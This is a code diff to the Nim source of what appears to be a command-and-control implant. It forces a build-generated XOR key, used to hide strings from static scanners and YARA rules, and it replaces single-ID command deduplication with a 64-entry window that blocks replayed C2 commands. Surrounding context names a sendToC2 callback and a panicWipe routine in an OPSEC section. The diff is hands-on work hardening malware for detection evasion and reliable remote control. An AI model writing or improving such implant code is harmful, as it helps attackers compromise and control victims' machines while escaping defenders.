@@ -336,13 +336,15 @@ proc getSystemInfo(): JsonNode =
 # ciphertext, but defeats static string scanners and YARA rules).
 #
 # The include file defines `const XorKey: array[16, byte]`.
-# If xorkey.nim is absent (no build script), a fixed default is used.
-# staticExec runs at compile time to check if the file exists.
-when staticExec("if exist xorkey.nim echo yes") == "yes":
-  include "xorkey.nim"
-else:
-  const XorKey: array[16, byte] = [byte 0x5A, 0xA5, 0x3C, 0xC3, 0x7E, 0xE7, 0x1F, 0xF1,
-                                              0x6B, 0xB6, 0x4D, 0xD4, 0x29, 0x92, 0x8A, 0xA8]
+# The build scripts (build.ps1 / build_sentinel.ps1) regenerate it
+# before each compile. There is deliberately NO fallback: if the
+# file is missing (or has the wrong key length, e.g. a leftover
+# 32-byte hardened key) the build fails loudly instead of silently
+# producing an agent whose decoded secrets are garbage.
+include "xorkey.nim"
+static:
+  doAssert XorKey.len == 16,
+    "xorkey.nim must define a 16-byte XorKey for baseline/sentinel builds"
 
 proc encodeObf(s: string): seq[byte] =
   result = newSeq[byte](s.len)
@@ -2678,8 +2680,13 @@ when defined(windows):
         if not autoDriveRunning: return
         await sleepAsync(100)
 
-# Dedup state: last seen command_id
-var lastCmdId: int64 = -1
+# Dedup state: sliding window of recently seen command_ids. The old
+# single `lastCmdId` only caught an exact repeat of the most recent
+# command — a replayed older frame with a different id passed. A
+# bounded window (64 ids) closes that hole without unbounded memory.
+const CMD_DEDUP_WINDOW = 64
+var seenCmdIds: array[CMD_DEDUP_WINDOW, int64]
+var seenCmdIdx = 0
 
 # Forward declaration so handleCommand can call panicWipe. The real
 # Windows implementation lives in the OPSEC section below; on other
@@ -2689,10 +2696,13 @@ proc panicWipe()
 proc handleCommand(sc: SessionCrypto, cmd: JsonNode,
                    sendToC2: proc(msg: JsonNode): Future[void] {.gcsafe.},
                    meta: ref MetaData): Future[void] {.async.} =
-  # Command dedup
+  # Command dedup (sliding window)
   let cid = (if cmd.hasKey("cid"): cmd["cid"].getInt() else: 0)
-  if cid > 0 and cid == lastCmdId: return
-  if cid > 0: lastCmdId = cid
+  if cid > 0:
+    for i in 0..<CMD_DEDUP_WINDOW:
+      if seenCmdIds[i] == cid: return
+    seenCmdIds[seenCmdIdx] = cid
+    seenCmdIdx = (seenCmdIdx + 1) mod CMD_DEDUP_WINDOW
 
   let cmdName = (if cmd.hasKey("cmd"): cmd["cmd"].getStr() else: "")
   let cmdArgs = (if cmd.hasKey("args"): cmd["args"].getStr() else: "")
